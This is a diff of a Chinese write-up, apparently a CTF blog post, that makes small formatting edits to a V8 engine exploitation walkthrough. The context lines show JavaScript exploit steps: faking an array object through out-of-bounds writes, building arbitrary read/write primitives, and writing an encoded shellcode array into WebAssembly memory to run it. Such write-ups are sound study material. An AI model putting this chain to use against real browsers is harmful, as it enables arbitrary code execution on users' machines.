@@ -129,7 +129,6 @@ pwndbg> job 0x3f6e6bd15fc9
 ```
 可以看到，length 被修改成了 32。
 
-
 ### 越界读
 先申请一块 Buffer 然后再获得 view，得到读取写入的功能，然后通过 view 的各种 set 和 get 就能实现数值类型转换
 ```js
@@ -152,7 +151,7 @@ x[3] = view.getFloat64(0, true);
 view.setBigInt64(0, doublemap, true);
 x[0] = view.getFloat64(0, true);
  ```
-x\[0]~x\[3] 构成了一个 `fake array object` ,其中 properties 字段为 0
+x\[0]~x\[3] 构成了一个 `fake array object` ，其中 properties 字段为 0
 
 ### 获取 fake array object
 ```js
@@ -161,7 +160,6 @@ x[22] = view.getFloat64(0, true);
 obj = y[0];
 ```
 通过越界写，修改 y\[0] , 也就是修改 y 的 elements 的第一个值，然后通过 y\[0] 获取伪造的对象
-
 
 ### 任意读写
 成功获取了一个可以任意修改字段的 array 对象，然后可以通过修改其中的 elements 字段来达到任意地址写，将这个过程封装为函数
@@ -200,7 +198,6 @@ var f = wasmInstance.exports.main;
 ```js
 let sc = [5188146770760222536n, 10180386957671122887n, 14035265928560645429n, 14359732973853474822n, 18388557918367661248n, 2409263538477991183n, 10416984888683040768n]
 
-
 y[1] = wasmInstance;
 view.setFloat64(0, x[23], true);
 let insaddr = view.getBigUint64(0, true) - 0x1n;
@@ -220,7 +217,6 @@ f();
 ```
 
 最后再调用 f ，也就是 wasm 代码，就能运行刚才写的 shellcode 了。
-
 
 ## 特别鸣谢
 在这里特别感谢 NepNep 战队的 [sysNow](https://sysnow.xyz/) 师傅。
